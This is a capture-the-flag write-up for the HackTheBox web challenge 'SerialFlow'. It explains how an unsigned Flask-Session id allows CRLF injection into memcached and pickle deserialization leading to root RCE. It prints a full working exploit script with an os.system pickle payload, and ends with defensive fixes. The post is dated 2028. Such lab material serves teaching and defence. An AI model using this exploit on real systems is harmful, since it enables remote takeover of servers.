---
layout: post
title: "SerialFlow"
date: 2028-04-24 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, deserialization, pickle, flask-session, memcached, crlf-injection, rce, cwe-502]
description: "A Flask app stores sessions as pickle in memcached and never signs the session id. The unsigned cookie is concatenated straight into the memcached key, so a CRLF-in-cookie command injection plants a malicious pickle and turns deserialization into remote code execution as root."
---

## Overview

SerialFlow is a Medium HackTheBox Web challenge. A Flask app keeps its sessions in memcached, serialized with Python **pickle**, and — crucially — never signs the session id. That combination lets us perform a [memcached command injection](https://cwe.mitre.org/data/definitions/77.html) through the cookie and turn [deserialization of untrusted data](https://cwe.mitre.org/data/definitions/502.html) into remote code execution as root.

## The technique

The `requirements.txt` is the tell: Flask 2.2.2, **Flask-Session 0.4.0**, **pylibmc 1.6.3**. `app.py` sets `SESSION_TYPE="memcached"` pointing at `127.0.0.1:11211`. Flask-Session stores the session dict as a raw pickle under the memcached key `session:<sid>`. The secret key is `uuid4()` — random per boot — so signed-cookie forgery is off the table.

We don't need it. **`SESSION_USE_SIGNER` defaults to `False`**, so the `session` cookie value *is* the raw session id, fully attacker-controlled, and it is concatenated into the memcached key with no sanitization. Because pylibmc/libmemcached forwards control bytes in the key, that is a memcached ASCII-protocol command injection.

HTTP headers can't carry raw `\r\n`, but a Werkzeug cookie **quoted-string with octal escapes** (`\015\012`) is decoded back into real CRLF inside the session id. So a crafted cookie smuggles extra memcached commands: a `set` that stores *our* pickle under a key we choose, then a second request reads that key and calls `pickle.loads()` on it — running a `__reduce__` payload that executes `os.system`.

## Solution

The flag is renamed to `/flag<10hex>.txt` at startup, and the box is behind NAT (no reverse shell), so the exploit exfiltrates by overwriting the Jinja template with the base64 flag between markers — then `GET /` returns it. Writing the raw flag instead breaks Jinja rendering (500), so base64 is the safe channel. The on-disk overwrite is persistent, surviving the container's `autorestart`.

Create `solve.py`:

```python
import os, pickle, requests, base64, re
BASE = "http://<host>:<port>"

CMD = "printf 'FLAGSTART%s FLAGEND' \"$(cat /flag*.txt | base64 -w0)\" > /app/application/templates/index.html"

class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))

payload = pickle.dumps(RCE(), protocol=0)
KEY = "z"
inj  = b"A\r\nset session:" + KEY.encode() + b" 0 2592000 " + str(len(payload)).encode() + b"\r\n"
inj += payload + b"\r\nget session:" + KEY.encode()
cookie = '"' + ''.join('\\%03o' % b for b in inj) + '"'   # octal-escape the whole sid; Werkzeug rebuilds CRLF

requests.get(BASE + "/", headers={"Cookie": "session=" + cookie})   # inject: SET pickle under session:z
requests.get(BASE + "/", headers={"Cookie": "session=" + KEY})      # trigger: pickle.loads(session:z) -> RCE

t = requests.get(BASE + "/").text
print(base64.b64decode(re.search(r'FLAGSTART(.*?) FLAGEND', t, re.S).group(1)).decode())
```

Keep the whole session id under 240 bytes — memcached enforces a 250-byte key limit, and the injection framing plus a short `os.system` pickle fits comfortably. Running it prints the flag (`HTB{...}`, redacted here).

## Why it worked

Two design flaws compose. Sessions are serialized with **pickle**, a code-execution format — deserializing attacker bytes is game over. And the session id is **unsigned and unsanitized**, dropped straight into the memcached key — so we can write arbitrary bytes to any cache entry. The CRLF-in-cookie quoted-string is the glue that converts cookie control into memcached protocol control.

## Fix / defense

- Never store sessions as pickle — use a signed, non-code serializer (JSON) and set `SESSION_USE_SIGNER=True`.
- Upgrade Flask-Session and whitelist the session-id charset so CRLF/control bytes can't reach the memcached key.
- Bind memcached to localhost, enable client key verification, and treat any cache key built from user input as an injection sink.
